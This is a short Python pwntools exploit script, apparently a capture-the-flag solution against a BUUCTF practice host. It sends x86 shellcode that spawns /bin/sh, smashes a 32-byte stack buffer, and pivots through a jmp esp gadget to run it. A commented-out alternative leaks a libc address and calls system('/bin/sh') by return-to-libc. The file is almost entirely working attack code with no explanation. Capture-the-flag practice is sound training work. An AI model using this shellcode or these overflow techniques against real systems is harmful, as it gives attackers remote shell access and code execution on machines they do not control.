from pwn import *
from LibcSearcher import *

io = remote("node4.buuoj.cn", 26668)

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

jmp_esp = 0x08048504
sub_esp_jmp = asm('sub esp, 0x28;jmp esp')

payload = shellcode_x86 + (0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
io.sendline(payload)

# io.recvuntil("What's your name?\n")

# puts_plt = 0x80483D0
# puts_got = 0x804A018
# main = 0x804850E

# payload = "a"*32 + p32(0) + p32(puts_plt) + p32(main) + p32(puts_got)
# io.sendline(payload)

# io.recvuntil(".")

# addr = u32(io.recv(4))
# print(hex(addr))

# libc = LibcSearcher("puts", addr)
# base = addr - libc.dump("puts")
# system = base + libc.dump("system")
# bin_sh = base + libc.dump("str_bin_sh")


# io.recvuntil("What's your name?\n")
# payload = "a"*32 + p32(0) + p32(system) + p32(main) + p32(bin_sh)
# io.sendline(payload)


# gdb.attach(io)
# raw_input()

io.interactive()